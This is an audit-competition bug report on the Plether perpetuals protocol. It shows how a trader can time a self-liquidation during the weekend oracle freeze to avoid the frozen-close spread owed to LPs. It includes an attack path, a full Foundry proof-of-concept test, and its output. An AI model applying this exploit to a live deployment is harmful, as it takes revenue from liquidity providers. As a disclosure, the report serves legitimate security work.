# \#99763 [SC-Medium] traders exit the weekly freeze through a self-timed liquidation, skipping the frozen-close spread that prices voluntary stale-price exits

**Submitted on Nov 15th 2026 at 06:42:15 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99763
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

while the FX market is closed for the weekend, the protocol prices every exit at the stored Friday mark. a voluntary close pays a fixed 50 bps spread to the LPs for that stale-price exit, plus the 4 bps execution fee. a liquidation pays neither, so that undercollateralized positions can still be closed during the freeze.

the trader decides when its own position becomes liquidatable. it parks its margin a few USDG above the 3% closure threshold, lets carry cross the line at the hour it picks, and then liquidates itself, or lets any keeper do it. the voluntary stale-price exit the spread was built for goes through the liquidation path and pays about 7.5 bps instead of 54 bps.

in the PoC a 400_000 USDG position exits this way during the freeze. the LPs lose 1_700.532512 USDG and the trader keeps 1_860.532512 USDG compared with the designed frozen close. when the close would have earned the trader a 400 USDG VPI rebate, the LPs still lose 1_300.087139 USDG.

## Vulnerability Details

### the frozen close pays the spread, the liquidation does not

a voluntary close while the oracle is frozen is assessed the execution fee and the spread on its notional (`CloseAccountingLib.sol#L120-L124`):

```solidity
        uint256 notionalAssets = (inputs.sizeDelta * inputs.oraclePrice) / CfdMath.ASSETS_TO_TOKEN_SCALE;
@>      state.executionFeeAssets = (notionalAssets * inputs.executionFeeBps) / 10_000;
@>      if (inputs.oracleFrozen) {
@>          state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;
        }
```

a liquidation computes one charge and splits it between the keeper and the LPs (`LiquidationAccountingLib.sol#L62-L78`):

```solidity
@>      uint256 liquidationChargeAssets = (notionalAssets * bountyBps) / 10_000;
        ...
@>      state.keeperBountyAssets = Math.mulDiv(liquidationChargeAssets, keeperShareBps, 10_000);
        state.protocolLiquidationFeeAssets = Math.mulDiv(liquidationChargeAssets, protocolShareBps, 10_000);
        state.lpLiquidationFeeAssets =
            liquidationChargeAssets - state.keeperBountyAssets - state.protocolLiquidationFeeAssets;
```

the docs tie the spread to the voluntary exit, not to a code path. the whitepaper gives its purpose as "Compensate LPs for voluntary stale-mark exit", paid to "LPs only; never treasury" (`WHITEPAPER.md:814`).

the liquidation exemption exists for liveness: the security notes justify it as preserving close and liquidation liveness while the market is really closed (`SECURITY.md:843-845`). it keeps involuntary liquidations working through the freeze. nothing keeps a liquidation involuntary.

### the trader picks the hour its position becomes liquidatable

for the whole freeze the liquidation threshold is the 3% FAD margin (`CfdEnginePlanLib.sol#L1450`):

```solidity
@>      uint256 maintMarginBps = snap.isFadWindow ? snap.riskParams.fadMarginBps : snap.riskParams.maintMarginBps;
```

every position held through the freeze already carries at least this 3%, or it is liquidated at the boundary. the trader only has to hold it a few USDG above the line.

`addMargin` works while frozen and checks only the caller (`CfdEngine.sol#L501-L507`), and carry is taken from position margin first (`MarginClearinghouseAccountingLib.sol#L95-L106`):

```solidity
@>      consumption.activeMarginConsumedAssets =
@>          buckets.activePositionMarginAssets < lossAssets ? buckets.activePositionMarginAssets : lossAssets;
```

carry is deterministic, so the trader picks the crossing hour by sizing the buffer above the threshold. while it wants to keep the position it tops the buffer up. when it wants out, it lets carry drain it. the frozen liquidation price is the stored mark moved 2.5 bps against the position: 25% of a synthesized 10 bps confidence (`PletherOracle.sol#L729-L742`, `PletherOracle.sol#L966-L971`).

### the exit is voluntary

`executeLiquidation` is permissionless and passes `msg.sender` as the keeper (`OrderLiquidationBatchLogic.sol#L727-L729`). the keeper half of the charge is credited to it (`MarginClearinghouse.sol#L1264-L1269`), and the margin above the price loss and the LP half of the charge is unlocked back to the trader (`CfdEnginePlanLib.sol#L1529-L1532`):

```solidity
@>      delta.settlementSeizedAssets = delta.pricePnlPledgeConsumedAssets + delta.lpLiquidationFeeAssets;
        delta.residualAssets = delta.riskState.equityAssets - int256(delta.liquidationChargeAssets);
@>      delta.residualPlan.mutation.positionMarginUnlockedAssets = pos.margin;
```

a trader who wants out never needs liquidation for liveness. the voluntary frozen close is live, executes at the same stored mark without a Pyth payload, and the PoC executes it in the same second. self-liquidation borrows the liquidation path only to skip the spread.

attack path, at the release parameters in `DEPLOYMENT.md` (`frozenCloseSpreadBps` 50, `executionFeeBps` 4, `fadMarginBps` 300, `bountyBps` 10, `keeperShareBps` 5_000):

1. on a 2_000_000 USDG pool with a 700_000 USDG LONG book, the trader opens a 400_000 USDG SHORT at 1.00000000 with 10_000 USDG margin.
2. Friday 21:28 UTC, before the 16:30 New York closure margin starts, the trader calls `addMargin` and parks its pledge at 12_107 USDG, 10 USDG above the frozen threshold of 12_097 USDG (3% of notional at the 0.99975 liquidation price plus 100 USDG of shift loss).
3. Friday 22:01 UTC, the oracle is frozen at the Friday mark (`MarketCalendarLib.sol#L38-L49`). the position is healthy, so neither the trader nor any keeper can liquidate it.
4. carry crosses the threshold 23 hours into the freeze, on Saturday. the trader calls `OrderRouter::executeLiquidation(trader, [])`.
5. the position closes at the stored mark less 2.5 bps. the trader pays the 10 bps charge and gets the keeper half back. no spread and no execution fee are charged.

PoC numbers, both exits from the same snapshot, second and price (USDG):

| | designed frozen close | self-liquidation |
|---|---|---|
| trader with a VPI rebate from its open, book unchanged: trader pays | 3_169.979401 | 1_309.446889 |
| same, pool receives | 3_009.979401 | 1_309.446889 |
| sole position, close would earn a VPI rebate: trader pays | 1_770.196994 | 310.109855 |
| same, pool receives | 1_610.196994 | 310.109855 |

in the first case VPI is the same on both exits to within 0.5 USDG: the close pays back the 999.39 USDG rebate from the open and the liquidation claws the same rebate back. the gap is the 2_000 USDG spread and the 160 USDG fee, against the 100 USDG price shift and the 199.95 USDG net charge: 1_860.05 USDG, measured 1_860.532512. in the second case the trader gives up a 400 USDG close rebate and still exits 1_460.087139 USDG cheaper.

## Impact Details

theft of unclaimed yield. the frozen-close spread is the LPs' revenue for a voluntary stale-price exit, and the self-timed liquidation takes that exit without paying it. the trader keeps what the LPs and the treasury were owed.

1. per 400_000 USDG exit the LPs lose 1_700.532512 USDG and the trader keeps 1_860.532512 USDG. when the designed close would have paid the trader a 400 USDG VPI rebate, the LPs still lose 1_300.087139 USDG and the trader keeps 1_460.087139 USDG. the remaining 160 USDG is the execution fee that only the close pays to the treasury.
2. the exit is open every weekend, on either side, to any position held through the freeze that is not already in profit by 3% of notional. the trader sets its buffer in the last live half hour and can top it up with `addMargin` once the final mark is in, so carry crosses the threshold inside the freeze whenever the final live mark has not moved more than the 2.5 bps frozen shift in the trader's favour. it needs no capital beyond the position's own margin, and it does not matter who sends the liquidation: when an unrelated keeper sends it, the trader still pays 1_509.396889 USDG instead of 3_169.979401 USDG.

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L124

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L62-L78

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1529-L1532

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L507

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol#L95-L106

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L742

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L966-L971

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L727-L729

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1264-L1269

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L38-L49

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L808-L814

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L835-L845

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L128-L146

## Proof of Concept

the test runs on the repository's `BasePerpTest` harness with the release risk and router parameters from `DEPLOYMENT.md`. every call is a production entry point (`commitOrder`, `executeOrder`, `updateMarkPrice`, `addMargin`, `executeLiquidation`, `TrancheVault` request and claim). Pyth is the repository's `MockPyth`, and the price stays at 1.00000000 for the whole test.

both tests fund a 2_000_000 USDG Junior tranche, park the trader's pledge 10 USDG above the frozen threshold on Friday before the closure margin starts, check that neither the trader nor a keeper can liquidate the position when the oracle freezes, find the first frozen hour at which carry has crossed the threshold, and then run three exits from one snapshot: the designed frozen close, the trader's self-liquidation, and a liquidation by an unrelated keeper.

1. `test_weekendSelfLiquidationSkipsFrozenSpread_vpiNeutral`: an honest 700_000 USDG LONG book, then the trader's 400_000 USDG SHORT, which receives a VPI rebate at open. VPI is the same on both exits to within 0.5 USDG.
2. `test_weekendSelfLiquidationSkipsFrozenSpread_forgoesCloseRebate`: the trader's 400_000 USDG LONG is the only position, so its close would earn back the VPI it paid at open.

create `packages/perps/test/perps/poc/WeekendSelfLiquidationExit.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice While the oracle is frozen a voluntary close pays the fixed 50 bps LP-owned frozen-close spread and the
///         4 bps execution fee (CloseAccountingLib.sol:120-124). A liquidation pays neither: only the 10 bps
///         liquidation charge, half of which goes to the keeper (LiquidationAccountingLib.sol:62-78), at the stored
///         mark moved 2.5 bps against the position (PletherOracle.sol:729-742, :966-971). The trader parks its pledge
///         just above the 3% frozen threshold (CfdEnginePlanLib.sol:1450) with addMargin, lets carry cross the line at
///         the hour it chooses, and exits through liquidation instead of the spread-paying close.
///         Release risk/router parameters (packages/perps/DEPLOYMENT.md). The price never moves.
contract WeekendSelfLiquidationExitTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // honest Junior LP
    address internal constant BOB = address(0xB0B); // honest trader
    address internal constant TRADER = address(0xBAD);
    address internal constant KEEPER = address(0xFEE0); // unrelated keeper

    uint256 internal constant P0 = 100_000_000; // 1.00000000
    uint256 internal constant HONEST_JUNIOR = 2_000_000e6;
    uint256 internal constant SIZE = 400_000e18; // 4,000 lots = 400,000 USDG notional
    uint256 internal constant OPEN_MARGIN = 10_000e6;

    // Frozen liquidation price: stored mark moved 25% of a synthesized 10 bps confidence (2.5 bps) against the position.
    // Liquidatable when pledge + price PnL <= 3% of notional at that price, i.e. pledge <= threshold below.
    // LONG:  4000 * 100_025_000 * 300 / 10_000 + 4000 * 25_000 = 12_003_000_000 + 100_000_000
    // SHORT: 4000 *  99_975_000 * 300 / 10_000 + 4000 * 25_000 = 11_997_000_000 + 100_000_000
    uint256 internal constant LONG_THRESHOLD = 12_103_000_000;
    uint256 internal constant SHORT_THRESHOLD = 12_097_000_000;
    // The trader sizes this buffer (and tops it up with addMargin while it wants to stay) to pick the exit hour.
    uint256 internal constant TOP_UP_BUFFER = 10e6;

    uint256 internal constant WED_07_JAN_2026_1400 = 1_767_794_400;
    uint256 internal constant FRI_09_JAN_2026_2128 = 1_767_994_080; // live, before the 16:30 NY (21:30 UTC) FAD start
    uint256 internal constant FRI_09_JAN_2026_2159 = 1_767_995_940; // last live tick before the 17:00 NY freeze
    uint256 internal constant FRI_09_JAN_2026_2201 = 1_767_996_060; // oracle frozen
    uint256 internal constant SUN_11_JAN_2026_2200 = 1_768_168_800; // 17:00 NY reopen

    uint256 internal clientNonce;

    struct Outcome {
        uint256 traderWealth;
        uint256 poolAssets;
        uint256 treasury;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.maxExecutionWindowSeconds = 60;
        rc.orderExecutionStalenessLimit = 60;
        rc.liquidationStalenessLimit = 15;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.orderSettlementWindow = 15;
        rc.maxComponentPublishTimeDivergence = 5;
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.minOpenNotionalAssets = 1000e6;
        rc.openOrderExecutionBountyBps = 1;
        rc.minOpenOrderExecutionBountyAssets = 10_000;
        rc.maxOpenOrderExecutionBountyAssets = 200_000;
        rc.positionProtectionTriggerBountyAssets = 200_000;
        rc.maxPendingOrders = 5;
        rc.maxPruneOrdersPerCall = 64;
        _setRouterConfig(rc);

        _fundAcct(TRADER, 50_000e6);
        _fundAcct(BOB, 200_000e6);
    }

    // ------------------------------------------------------------------ helpers

    function _fundAcct(
        address a,
        uint256 amount
    ) internal {
        settlementToken.mint(a, amount);
        vm.startPrank(a);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(a, amount);
        vm.stopPrank();
    }

    function _step(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory u) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ups[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(int256(price)),
                    conf: 0,
                    expo: int32(-8),
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        u = new bytes[](1);
        u[0] = abi.encode(ups);
    }

    function _markAt(
        uint256 price,
        uint256 t
    ) internal {
        _step(t);
        vm.prank(KEEPER);
        router.updateMarkPrice(_payload(price, t));
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _step(vault.depositEpochStart(id) + 1);
        _step(vm.getBlockTimestamp() + 1);
        vm.prank(KEEPER);
        router.settleLpEpoch(_payload(P0, vm.getBlockTimestamp()));
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("weekend-self-liquidation-exit", ++clientNonce));
        r.side = side;
        r.sizeDelta = sizeDelta;
        r.marginDelta = marginDelta;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        r.isClose = isClose;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _openAt(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 t
    ) internal {
        _markAt(P0, t);
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, false);
        vm.prank(a);
        uint64 id = router.commitOrder(req);
        _step(t + 1);
        vm.prank(KEEPER);
        router.executeOrder(id, _payload(P0, t + 1));
        assertEq(_size(a), size, "open filled");
    }

    function _size(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _outcome() internal view returns (Outcome memory o) {
        o.traderWealth = settlementToken.balanceOf(TRADER) + clearinghouse.balanceAssets(TRADER);
        o.poolAssets = pool.totalAssets();
        o.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _tryLiquidate(
        address caller
    ) internal returns (bool ok) {
        vm.prank(caller);
        (ok,) = address(router).call(abi.encodeCall(router.executeLiquidation, (TRADER, new bytes[](0))));
    }

    function _fundJunior() internal {
        _markAt(P0, WED_07_JAN_2026_1400);
        settlementToken.mint(ALICE, HONEST_JUNIOR);
        _lpDeposit(juniorVault, ALICE, HONEST_JUNIOR);
    }

    /// Parks the pledge just above the frozen threshold before the freeze, lets carry cross it, then runs the designed
    /// frozen close, the trader's self-liquidation and an unrelated keeper's liquidation from one snapshot.
    function _weekendExit(
        CfdTypes.Side side,
        uint256 threshold
    ) internal returns (Outcome memory start, Outcome memory closeOut, Outcome memory selfOut, Outcome memory keeperOut) {
        // Friday 21:28 UTC, live: park the pledge TOP_UP_BUFFER above the frozen liquidation threshold.
        _markAt(P0, FRI_09_JAN_2026_2128);
        vm.prank(TRADER);
        engine.addMargin(TRADER, 1); // realizes accrued carry first
        uint256 target = threshold + TOP_UP_BUFFER;
        uint256 topUp = target - clearinghouse.pnlPledgeAssets(TRADER);
        vm.prank(TRADER);
        engine.addMargin(TRADER, topUp);
        assertEq(clearinghouse.pnlPledgeAssets(TRADER), target, "pledge parked above the frozen threshold");

        // Last live tick, then the freeze. The position is healthy: nobody can liquidate it.
        _markAt(P0, FRI_09_JAN_2026_2159);
        _step(FRI_09_JAN_2026_2201);
        assertTrue(engine.isOracleFrozen(), "weekly freeze");
        assertFalse(_tryLiquidate(TRADER), "healthy at the start of the freeze");
        assertFalse(_tryLiquidate(KEEPER), "no keeper can liquidate it either");

        // Carry drains the buffer. Find the first frozen hour at which the position crosses the threshold.
        uint256 crossAt;
        for (uint256 t = FRI_09_JAN_2026_2201 + 1 hours; t < SUN_11_JAN_2026_2200; t += 1 hours) {
            _step(t);
            uint256 probe = vm.snapshotState();
            bool ok = _tryLiquidate(KEEPER);
            vm.revertToState(probe);
            if (ok) {
                crossAt = t;
                break;
            }
        }
        assertGt(crossAt, 0, "carry crossed the threshold before the reopen");
        assertTrue(engine.isOracleFrozen(), "still frozen");
        console2.log("hours into the freeze when carry crossed", (crossAt - FRI_09_JAN_2026_2201) / 1 hours);

        start = _outcome();
        uint256 snap = vm.snapshotState();

        // Designed exit: voluntary frozen full close at the stored mark, executed by the trader without a payload.
        OrderV3Types.OrderRequest memory closeReq = _request(side, SIZE, 0, true);
        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(closeReq);
        _step(crossAt + 1);
        vm.prank(TRADER);
        router.executeOrder(closeId, new bytes[](0));
        assertEq(_size(TRADER), 0, "voluntary frozen close executed");
        closeOut = _outcome();

        // Attack: same second, same stored mark, the trader liquidates itself.
        vm.revertToState(snap);
        _step(crossAt + 1);
        assertTrue(_tryLiquidate(TRADER), "self-liquidation at the stored mark");
        assertEq(_size(TRADER), 0, "position liquidated");
        selfOut = _outcome();

        // Same exit when an unrelated keeper liquidates first.
        vm.revertToState(snap);
        _step(crossAt + 1);
        assertTrue(_tryLiquidate(KEEPER), "third-party liquidation");
        keeperOut = _outcome();
    }

    function _report(
        Outcome memory start,
        Outcome memory closeOut,
        Outcome memory selfOut,
        Outcome memory keeperOut
    ) internal pure {
        console2.log("trader pays, voluntary frozen close  ", start.traderWealth - closeOut.traderWealth);
        console2.log("trader pays, self-liquidation        ", start.traderWealth - selfOut.traderWealth);
        console2.log("trader pays, third-party liquidation ", start.traderWealth - keeperOut.traderWealth);
        console2.log("pool receives, voluntary frozen close", closeOut.poolAssets - start.poolAssets);
        console2.log("pool receives, self-liquidation      ", selfOut.poolAssets - start.poolAssets);
        console2.log("treasury receives, voluntary close   ", closeOut.treasury - start.treasury);
        console2.log("trader gain vs designed exit (self)  ", selfOut.traderWealth - closeOut.traderWealth);
        console2.log("trader gain vs designed exit (keeper)", keeperOut.traderWealth - closeOut.traderWealth);
        console2.log("LP loss vs designed exit             ", closeOut.poolAssets - selfOut.poolAssets);
    }

    // ------------------------------------------------------------------ tests

    /// A SHORT opened against an existing 700k LONG book received a VPI rebate; the book has not changed since, so the
    /// close pays the rebate back and the liquidation claws it back: VPI is the same on both exits to within 0.5 USDG.
    /// The gap is the frozen-close spread and the execution fee.
    function test_weekendSelfLiquidationSkipsFrozenSpread_vpiNeutral() public {
        _fundJunior();
        uint256 t0 = vm.getBlockTimestamp();
        _openAt(BOB, CfdTypes.Side.LONG, 700_000e18, 50_000e6, t0 + 600);
        _openAt(TRADER, CfdTypes.Side.SHORT, SIZE, OPEN_MARGIN, t0 + 1200);
        (,,,,,, int256 vpiAccrued) = engine.positions(TRADER);
        console2.log("trader lifetime VPI after open (signed, negative = rebate)");
        console2.logInt(vpiAccrued);
        assertLt(vpiAccrued, 0, "trader opened skew-reducing and received a rebate");

        (Outcome memory start, Outcome memory closeOut, Outcome memory selfOut, Outcome memory keeperOut) =
            _weekendExit(CfdTypes.Side.SHORT, SHORT_THRESHOLD);
        _report(start, closeOut, selfOut, keeperOut);

        assertGt(selfOut.traderWealth, closeOut.traderWealth, "self-liquidation exits cheaper than the frozen close");
        assertGt(keeperOut.traderWealth, closeOut.traderWealth, "even a third-party liquidation is cheaper");
        assertLt(selfOut.poolAssets, closeOut.poolAssets, "LPs lose the frozen-close spread");
    }

    /// The only open position: its close reduces skew and would earn back the VPI it paid at open. Self-liquidation
    /// gives that rebate up and is still cheaper, because it skips the spread and the fee.
    function test_weekendSelfLiquidationSkipsFrozenSpread_forgoesCloseRebate() public {
        _fundJunior();
        uint256 t0 = vm.getBlockTimestamp();
        _openAt(TRADER, CfdTypes.Side.LONG, SIZE, OPEN_MARGIN, t0 + 600);
        (,,,,,, int256 vpiAccrued) = engine.positions(TRADER);
        console2.log("trader lifetime VPI after open (signed, positive = paid)");
        console2.logInt(vpiAccrued);
        assertGt(vpiAccrued, 0, "trader paid VPI at open; its close would earn a rebate");

        (Outcome memory start, Outcome memory closeOut, Outcome memory selfOut, Outcome memory keeperOut) =
            _weekendExit(CfdTypes.Side.LONG, LONG_THRESHOLD);
        _report(start, closeOut, selfOut, keeperOut);

        assertGt(selfOut.traderWealth, closeOut.traderWealth, "self-liquidation exits cheaper than the frozen close");
        assertGt(keeperOut.traderWealth, closeOut.traderWealth, "even a third-party liquidation is cheaper");
        assertLt(selfOut.poolAssets, closeOut.poolAssets, "LPs lose the frozen-close spread");
    }

}
```

run from `packages/perps`:

```bash
forge test --match-path test/perps/poc/WeekendSelfLiquidationExit.t.sol -vv
```

output:

```bash
Ran 2 tests for test/perps/poc/WeekendSelfLiquidationExit.t.sol:WeekendSelfLiquidationExitTest
[PASS] test_weekendSelfLiquidationSkipsFrozenSpread_forgoesCloseRebate() (gas: 9812004)
Logs:
  trader lifetime VPI after open (signed, positive = paid)
  399999600
  hours into the freeze when carry crossed 23
  trader pays, voluntary frozen close   1770196994
  trader pays, self-liquidation         310109855
  trader pays, third-party liquidation  510109855
  pool receives, voluntary frozen close 1610196994
  pool receives, self-liquidation       310109855
  treasury receives, voluntary close    160000000
  trader gain vs designed exit (self)   1460087139
  trader gain vs designed exit (keeper) 1260087139
  LP loss vs designed exit              1300087139

[PASS] test_weekendSelfLiquidationSkipsFrozenSpread_vpiNeutral() (gas: 11991592)
Logs:
  trader lifetime VPI after open (signed, negative = rebate)
  -999386877
  hours into the freeze when carry crossed 23
  trader pays, voluntary frozen close   3169979401
  trader pays, self-liquidation         1309446889
  trader pays, third-party liquidation  1509396889
  pool receives, voluntary frozen close 3009979401
  pool receives, self-liquidation       1309446889
  treasury receives, voluntary close    160000000
  trader gain vs designed exit (self)   1860532512
  trader gain vs designed exit (keeper) 1660582512
  LP loss vs designed exit              1700532512

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 34.39ms (53.82ms CPU time)

Ran 1 test suite in 35.11ms (34.39ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

in both tests the position is healthy when the freeze starts, becomes liquidatable only through carry at the hour the trader's buffer set, and the voluntary frozen close executes at the same mark and second. the liquidation path skips the 2_000 USDG spread and the 160 USDG fee. the LPs end 1_700.532512 USDG poorer in the first test and 1_300.087139 USDG poorer in the second.
